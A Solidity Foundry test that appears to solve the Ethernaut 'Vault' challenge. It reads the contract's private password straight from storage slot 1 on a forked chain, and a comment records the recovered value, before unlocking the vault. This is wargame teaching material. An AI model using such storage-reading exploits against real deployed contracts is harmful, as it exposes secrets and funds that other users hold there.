// SPDX-License-Identifier: UNLICENSED

// forge test --contracts src/test/Vault.t.sol --fork-url $rpc -vvvv
pragma solidity ^0.6.0;

import "ds-test/test.sol";
import "forge-std/console.sol";
import "forge-std/Vm.sol";
import "../Vault.sol";

contract VaultTest is DSTest {
    Vault obj;
    Vm vm = Vm(HEVM_ADDRESS);
    address player_address;
    address contract_address;
    function setUp() public {    
        contract_address = 0x241988767B7B6d33142Bd1B3C4A9AE8c7bA49fe9;
        player_address = 0xae22f26D5ddfE22d24aA28AEB1D44c962c673438;
        obj = Vault(contract_address);
    }

    function testVaultUnlocked() public {
        vm.startPrank(player_address);
        console.log("Contract Address =", contract_address);
        console.log("Vault initial state =", obj.locked());
        bytes32 pwd = vm.load(contract_address, bytes32(uint256(1)));
        // pwd = 0x412076657279207374726f6e67207365637265742070617373776f7264203a29
        // (bool success, ) = address(obj).call(abi.encodeWithSignature("pwn()"));
        // require(success, "Failed tx");
        obj.unlock(pwd);
        console.log("Vault end state =", obj.locked());
        assert(obj.locked() == false);
        vm.stopPrank();
    }
}
